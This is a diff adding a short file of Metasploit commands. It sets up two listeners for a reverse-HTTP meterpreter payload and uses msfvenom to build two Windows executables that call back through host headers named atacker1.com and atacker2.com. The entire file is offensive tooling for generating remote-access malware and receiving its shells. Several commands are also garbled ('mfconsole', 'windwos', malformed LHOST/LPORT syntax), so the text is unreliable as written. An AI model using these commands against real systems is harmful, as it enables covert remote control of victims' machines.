@@ -1,0 +1,22 @@
+mfconsole
+use exploit/multi/handler
+set payload windwos/meterpreter_reverse_http
+set LHOST 10.0.1.20
+set LPORT 80
+set ReverseListenerBindAddress 10.0.1.20
+set ReverseListenerBindPort 10080
+exploit -j -z
+
+mfconsole
+use exploit/multi/handler
+set payload windwos/meterpreter_reverse_http
+set LHOST 10.0.1.20
+set LPORT 80
+set ReverseListenerBindAddress 10.0.1.20
+set ReverseListenerBindPort 20080
+exploit -j -z
+
+
+
+msfvenom -p windwos/meterpreter_reverse_http LHOST 10.0.1.20 LPORT:80 HttpHostHeader=atacker1.com -f exe -o payload1.exe
+msfvenom -p windwos/meterpreter_reverse_http LHOST 10.0.1.20 LPORT:80 HttpHostHeader=atacker2.com -f exe -o payload2.exe
